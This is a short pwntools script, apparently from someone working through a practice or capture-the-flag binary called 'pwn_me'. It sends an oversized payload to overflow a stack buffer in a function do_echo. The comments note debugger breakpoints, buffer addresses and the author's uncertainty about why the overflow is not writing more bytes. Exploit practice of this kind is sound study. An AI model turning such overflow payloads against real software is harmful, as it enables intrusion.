from pwn import *

p = process("./pwn_me")
input()
print(p.recv())
payload = b'\xff'
#b *do_echo+127
payload += b'B' * 0x200
# Got the stack overflow finally
# first buf: 0x7ffc03cd1708 -> How may bytest to read
# second buf: 0x7ffc03cd1710
# Ok, so, why is the (b *do_echo+178) not dropping more bytes in there?
p.sendline(payload)
print(p.recv())
p.sendline(b'hello')
print(p.recv())
